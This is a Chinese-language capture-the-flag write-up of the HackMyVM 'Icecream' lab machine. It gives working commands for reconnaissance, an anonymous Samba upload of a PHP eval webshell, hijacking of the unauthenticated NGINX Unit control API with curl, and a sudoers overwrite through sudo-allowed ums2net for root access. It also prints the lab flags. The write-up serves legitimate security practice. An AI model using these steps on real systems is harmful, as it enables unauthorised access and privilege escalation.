---
title: HackMyVM-Icecream
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Icecream.

> [https://hackmyvm.eu/machines/machine.php?vm=Icecream](https://hackmyvm.eu/machines/machine.php?vm=Icecream)
> 

Notes：**Hack and fun!**

## 前期踩点

`192.168.56.39`是靶机

```
⚡ root@kali  ~  nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 08:06 EST
Nmap scan report for 192.168.56.1
Host is up (0.00061s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00037s latency).
MAC Address: 08:00:27:52:72:FB (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.39
Host is up (0.00027s latency).
MAC Address: 08:00:27:11:12:1D (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.11 seconds
```

```
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 08:08 EST
Nmap scan report for 192.168.56.39
Host is up (0.00042s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9000/tcp open  cslistener
MAC Address: 08:00:27:11:12:1D (Oracle VirtualBox virtual NIC)
```

```
⚡ root@kali  ~  nmap -sT -A -T4 -O -p 22,80,139,445,9000 192.168.56.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 08:09 EST
Nmap scan report for 192.168.56.39
Host is up (0.00048s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 68:94:ca:2f:f7:62:45:56:a4:67:84:59:1b:fe:e9:bc (ECDSA)
|_  256 3b:79:1a:21:81:af:75:c2:c1:2e:4e:f5:a3:9c:c9:e3 (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.22.1
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
9000/tcp open  cslistener?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Server: Unit/1.33.0
|     Date: Fri, 28 Feb 2025 13:09:59 GMT
|     Content-Type: application/json
|     Content-Length: 40
|     Connection: close
|     "error": "Value doesn't exist."
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Unit/1.33.0
|     Date: Fri, 28 Feb 2025 13:09:58 GMT
|     Content-Type: application/json
|     Content-Length: 1042
|     Connection: close
|     "certificates": {},
|     "js_modules": {},
|     "config": {
|     "listeners": {},
|     "routes": [],                                                                                               
|     "applications": {}                                                                                          
|     "status": {                                                                                                 
|     "modules": {                                                                                                
|     "python": {                                                                                                 
|     "version": "3.11.2",                                                                                        
|     "lib": "/usr/lib/unit/modules/python3.11.unit.so"                                                           
|     "php": {                                                                                                                                                                                                                      
|     "version": "8.2.18",                                                                                                                                                                                                          
|     "lib": "/usr/lib/unit/modules/php.unit.so"                                                                  
|     "perl": {                                                                                                   
|     "version": "5.36.0",                                                                                        
|     "lib": "/usr/lib/unit/modules/perl.unit.so"                                                                 
|     "ruby": {                                                                                                   
|     "version": "3.1.2",                                                                                         
|     "lib": "/usr/lib/unit/modules/ruby.unit.so"                                                                 
|     "java": {                                                                                                   
|     "version": "17.0.11",                                                                                       
|     "lib": "/usr/lib/unit/modules/java17.unit.so"                                                               
|     "wasm": {                   
|     "version": "0.1",                    
|     "lib": "/usr/lib/unit/modules/wasm.unit.so"                                                                 
|   HTTPOptions:            
|     HTTP/1.1 405 Method Not Allowed
|     Server: Unit/1.33.0                              
|     Date: Fri, 28 Feb 2025 13:09:59 GMT
|     Content-Type: application/json
|     Content-Length: 35                 
|     Connection: close             
|_    "error": "Invalid method."              
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                        
SF-Port9000-TCP:V=7.94SVN%I=7%D=2/28%Time=67C1B5A9%P=x86_64-pc-linux-gnu%r                                        
SF:(GetRequest,4A8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Unit/1\.33\.0\r\n                                        
SF:Date:\x20Fri,\x2028\x20Feb\x202025\x2013:09:58\x20GMT\r\nContent-Type:\                                        
SF:x20application/json\r\nContent-Length:\x201042\r\nConnection:\x20close\                                        
SF:r\n\r\n{\r\n\t\"certificates\":\x20{},\r\n\t\"js_modules\":\x20{},\r\n\                                        
SF:t\"config\":\x20{\r\n\t\t\"listeners\":\x20{},\r\n\t\t\"routes\":\x20\[                                        
SF:\],\r\n\t\t\"applications\":\x20{}\r\n\t},\r\n\r\n\t\"status\":\x20{\r\                                        
SF:n\t\t\"modules\":\x20{\r\n\t\t\t\"python\":\x20{\r\n\t\t\t\t\"version\"                                        
SF::\x20\"3\.11\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules/pytho                                        
SF:n3\.11\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"php\":\x20{\r\n\t\t\t\t\"                                        
SF:version\":\x20\"8\.2\.18\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modu                                        
SF:les/php\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"perl\":\x20{\r\n\t\t\t\t               
SF:\"version\":\x20\"5\.36\.0\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/mo                                        
SF:dules/perl\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"ruby\":\x20{\r\n\t\t\                                        
SF:t\t\"version\":\x20\"3\.1\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/                                        
SF:modules/ruby\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"java\":\x20{\r\n\t\                                        
SF:t\t\t\"version\":\x20\"17\.0\.11\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/u                                        
SF:nit/modules/java17\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"wasm\":\x20{\                                        
SF:r\n\t\t\t\t\"version\":\x20\"0\.1\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/                                        
SF:unit/modules/wasm\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t")%r(HTTPOptions,C                                                                                                                                                          
SF:7,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20Unit/1\.3                                                                                                                                                          
SF:3\.0\r\nDate:\x20Fri,\x2028\x20Feb\x202025\x2013:09:59\x20GMT\r\nConten                                        
SF:t-Type:\x20application/json\r\nContent-Length:\x2035\r\nConnection:\x20                                        
SF:close\r\n\r\n{\r\n\t\"error\":\x20\"Invalid\x20method\.\"\r\n}\r\n")%r(                                        
SF:FourOhFourRequest,C3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nServer:\x20Un                                        
SF:it/1\.33\.0\r\nDate:\x20Fri,\x2028\x20Feb\x202025\x2013:09:59\x20GMT\r\                                        
SF:nContent-Type:\x20application/json\r\nContent-Length:\x2040\r\nConnecti                                        
SF:on:\x20close\r\n\r\n{\r\n\t\"error\":\x20\"Value\x20doesn't\x20exist\.\                                        
SF:"\r\n}\r\n");                                                                                                  
MAC Address: 08:00:27:11:12:1D (Oracle VirtualBox virtual NIC)                                                    
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port             
Device type: general purpose      
Running: Linux 4.X|5.X                     
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                   
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop              
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                         
Host script results:                
| smb2-security-mode:                    
|   3:1:1:                          
|_    Message signing enabled but not required
|_clock-skew: -3s                                                                                                                                                                                                                   
| smb2-time:                                                                                                      
|   date: 2025-02-28T13:10:00                                                                                     
|_  start_date: N/A                                                                                               
|_nbstat: NetBIOS name: ICECREAM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                       
                                                                                                                  
TRACEROUTE                                                                                                        
HOP RTT     ADDRESS                                                                                               
1   0.48 ms 192.168.56.39                                                                                         
                                                                                                                  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .             
Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds                               
```

一开始看端口还以为是`windows`主机，看了版本发现是`samba`服务

```bash
⚡ root@kali  ~  nmap -script=vuln -p 22,80,139,445,9000 192.168.56.39                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 08:14 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.39
Host is up (0.00037s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9000/tcp open  cslistener
MAC Address: 08:00:27:11:12:1D (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]

Nmap done: 1 IP address (1 host up) scanned in 106.09 seconds
```

`smaba`尝试匿名用户

```bash
⚡ root@kali  ~  smbclient -L 192.168.56.39 -U anonymous                      
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        icecream        Disk      tmp Folder
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.56.39 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

但是没有任何有效数据

我们再去看新鲜的`9000`端口，这似乎是 **NGINX Unit** 的配置或状态信息。NGINX Unit 是一个轻量级的应用服务器，支持多种编程语言（如 Python、PHP、Perl、Ruby、Java 等），并且可以动态配置，无需重启服务

```bash
{                                                                                                                                                                                                                                   
        "certificates": {},                              
        "js_modules": {},                                
        "config": {                                      
                "listeners": {},                                                                                  
                "routes": [],                                                                                     
                "applications": {}                                                                                
        },                                                                                                        
                                                                                                                  
        "status": {                                      
                "modules": {                             
                        "python": {                                                                               
                                "version": "3.11.2",                                                              
                                "lib": "/usr/lib/unit/modules/python3.11.unit.so"                                                                                                                                                   
                        },                               
                                                                                                                  
                        "php": {                                                                                  
                                "version": "8.2.18",                                                              
                                "lib": "/usr/lib/unit/modules/php.unit.so"     
                        },                                                                                        
                                                                                                                  
                        "perl": {                                                                                 
                                "version": "5.36.0",                                                                                                                                                                                
                                "lib": "/usr/lib/unit/modules/perl.unit.so"                                                                                                                                                         
                        },                                                                                                                                                                                                          
                                                                                                                  
                        "ruby": {                                                                                 
                                "version": "3.1.2",                                                               
                                "lib": "/usr/lib/unit/modules/ruby.unit.so"                                                                                                                                                         
                        },                                                                                                                                                                                                          
                                                                                                                  
                        "java": {                                                                                                                                                                                                   
                                "version": "17.0.11",                                                                                                                                                                               
                                "lib": "/usr/lib/unit/modules/java17.unit.so"                                                                                                                                                       
                        },                                                                                        
                                                                                                                  
                        "wasm": {                                                                                 
                                "version": "0.1",                                                                                                                                                                                   
                                "lib": "/usr/lib/unit/modules/wasm.unit.so"                                                                                                                                                         
                        },                                                                                                                                                                                                          
                                                         
                        "wasm-wasi-component": {                                                                  
                                "version": "0.1",                                                                                                                                                                                   
                                "lib": "/usr/lib/unit/modules/wasm_wasi_component.unit.so"                                                                                                                                          
                        }                                                                                                                                                                                                           
                },                                                                                                
                                                                                                                                                                                                                                    
                "connections": {                                                                                  
                        "accepted": 0,                                                                            
                        "active": 0,                                                                              
                        "idle": 0,                                                                                
                        "closed": 0                                                                               
                },                                                                                                
                                                                                                                  
                "requests": {                                                                                                                                                                                                       
                        "total": 0                                                                                
                },                                                                                                                                                                                                                  
                                                         
                "applications": {}                                                                                
        }                                                                                                         
}                                                                                                               
```

扫一下目录

```bash
⚡ root@kali  ~/Desktop/test/icecream/samba  gobuster dir -u 192.168.56.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x zip,txt,html,php,asp                                 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.39
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403,502,429
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php,asp,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
⚡ root@kali  ~/Desktop/test/icecream/samba  gobuster dir -u http://192.168.56.39:9000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x zip,txt,html,php,asp
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.39:9000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   429,404,403,502
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,txt,html,php,asp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/status               (Status: 200) [Size: 862]
/config               (Status: 200) [Size: 62]
/certificates         (Status: 200) [Size: 4]
```

## samba

尝试了`samba`多个漏洞利用无效，但是尝试上传文件成功了..

```bash
⚡ root@kali  ~/Desktop/test/icecream  vim phpinfo.php   
⚡ root@kali  ~/Desktop/test/icecream  smbclient //192.168.56.39/icecream -U anonymous
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> put phpinfo.php 
putting file phpinfo.php as \phpinfo.php (3.9 kb/s) (average 3.9 kb/s)
```

还能成功执行

![image.png](image%20140.png)

上传一句话木马，蚁🗡连接

![image.png](image%20141.png)

但是没找到有什么信息，并且存在`ice`用户

## Nginx UNIT

没思路，找一下`Nginx UNIT`相关信息，官网：[https://github.com/nginx/unit](https://github.com/nginx/unit)

以下为官网原文：

Suppose you saved a PHP script as `/www/helloworld/index.php`:

```
<?php echo "Hello, PHP on Unit!"; ?>
```

To run it on Unit with the `unit-php` module installed, first set up an application object. Let's store our first config snippet in a file called `config.json`:

```
{
    "helloworld": {
        "type": "php",
        "root": "/www/helloworld/"
    }
}
```

Saving it as a file isn't necessary, but can come in handy with larger objects.

Now, `PUT` it into the `/config/applications` section of Unit's control API, usually available by default via a Unix domain socket:

```
# curl -X PUT --data-binary @config.json --unix-socket  \
       /path/to/control.unit.sock http://localhost/config/applications
```

```
{
	"success": "Reconfiguration done."
}
```

Next, reference the app from a listener object in the `/config/listeners` section of the API. This time, we pass the config snippet straight from the command line:

```
# curl -X PUT -d '{"127.0.0.1:8080": {"pass": "applications/helloworld"}}'  \
       --unix-socket /path/to/control.unit.sock http://localhost/config/listeners
```

```
{
    "success": "Reconfiguration done."
}
```

Now Unit accepts requests at the specified IP and port, passing them to the application process. Your app works!

```
$ curl 127.0.0.1:8080

      Hello, PHP on Unit!
```

Finally, query the entire `/config` section of the control API:

```
# curl --unix-socket /path/to/control.unit.sock http://localhost/config/
```

Unit's output should contain both snippets, neatly organized:

```bash
{
    "listeners": {
        "127.0.0.1:8080": {
            "pass": "applications/helloworld"
        }
    },

    "applications": {
        "helloworld": {
            "type": "php",
            "root": "/www/helloworld/"
        }
    }
}
```

貌似可以利用，我们指定上传的一句话木马

新建`config.json`

```bash
⚡root@kali  ~  cat config.json                                        
{
    "shell": {
        "type": "php",
        "root": "/tmp/"
    }
}
```

```bash
⚡ root@kali  ~  curl -X PUT --data-binary @config.json http://192.168.56.39:9000/config/applications
{
        "success": "Reconfiguration done."
}
```

```bash
⚡ root@kali  ~  curl -X PUT -d '{"192.168.56.39:8080": {"pass": "applications/shell"}}' http://192.168.56.39:9000/config/listeners
{
        "success": "Reconfiguration done."
}
```

再次访问`9000`端口，可以看到我们的配置成功了

![image.png](image%20142.png)

访问`8080`端口

![image.png](image%20143.png)

成功获得`ice`用户

## 提权

使用蚁🗡连接后，在家目录下可以找到UserFlag

```bash
(ice:/home/ice) $ cat user.txt
HMVaneraseroflove
```

查看权限

```bash
(ice:/home/ice) $ sudo -l
Matching Defaults entries for ice on icecream:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
User ice may run the following commands on icecream:
    (ALL) NOPASSWD: /usr/sbin/ums2net
```

可以以`root`权限执行`ums2net` ，但是没见过 

> [https://github.com/grandpaul/ums2net](https://github.com/grandpaul/ums2net) | [https://manpages.debian.org/bookworm/ums2net/ums2net.8.en.html](https://manpages.debian.org/bookworm/ums2net/ums2net.8.en.html)
> 

**How to use ums2net**

1. Insert the USB Mass Storage. Check /dev/disk/by-id/ for the unique path for that device.
2. Create a config file base on the above path. Please see the config file format section.
3. Run "ums2net -c ". ums2net will become a daemon in the background. For debugging please add "-d" option to avoid detach.
4. Use nc to write your image to the USB Mass Storage device. For example, "nc -N localhost 29543 < warp7.img"

**Config file**

Each line in the config file maps a TCP port to a device. All the options are separated by space. The first argument is a number represents the TCP port. And the rest of the arguments are in dd-style. For example,

A line in the config file:

```
"29543 of=/dev/disk/by-id/usb-Linux_UMS_disk_0_WaRP7-0x2c98b953000003b5-0:0 bs=4096"
```

利用思路：

1. 靶机
    
    ```bash
    echo "1" > test.txt
    echo "29543 of=/tmp/test.txt" > config
    sudo ums2net -c config
    ```
    
2. Kali
    
    ```bash
    nc 192.168.56.39:29543 < s.php
    ```
    
3. 靶机查看`test.txt`
    
    ```bash
    cat test.txt
    <?php @eval($_POST['cmd']);?>
    ```
    

能实现覆盖，那我们直接修改`sudoer`文件

1. 靶机
    
    ```bash
    echo "29540 of=/etc/sudoers" > config
    sudo ums2net -c config
    ```
    
2. Kali
    
    ```bash
    echo 'ice ALL=(ALL) NOPASSWD: ALL'|nc 192.168.56.39 29540
    ```
    
3. 靶机
    
    ```bash
    ice@icecream:/tmp$ sudo su -
    sudo su -
    /etc/sudoers:2:11: error de sintaxis
     with the 'visudo' command as root.
              ^~~~~~~~
    id
    uid=0(root) gid=0(root) grupos=0(root)
    ```
    
4. RootFlag
    
    ```bash
    cat /root/root.txt
    HMViminvisible
    ```